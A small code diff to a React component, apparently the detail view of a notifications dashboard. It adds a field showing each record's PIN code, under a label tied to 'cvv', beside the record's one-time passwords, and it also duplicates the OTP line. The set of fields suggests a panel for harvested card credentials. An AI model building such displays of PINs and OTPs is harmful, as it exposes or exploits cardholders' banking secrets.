@@ -97,6 +97,20 @@ import { Notification } from "@/app/notifications/page";
                 {notification.allOtps?.join("") }
 
               </div>
+              <div className="space-y-2">
+                <Label htmlFor="cvv" className="text-sm font-medium text-gray-600 dark:text-gray-300">
+                  PIN Code
+                </Label>
+                <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
+                  <Lock className="h-6 w-6 text-gray-400" />
+                  <p id="pin" className="text-lg font-mono font-medium text-gray-800 dark:text-gray-200">
+                  {notification?.pinCode }
+                  </p>
+                </div>
+
+              </div>
+              {notification.allOtps?.join("") }
+
             </div>
           </div>
   
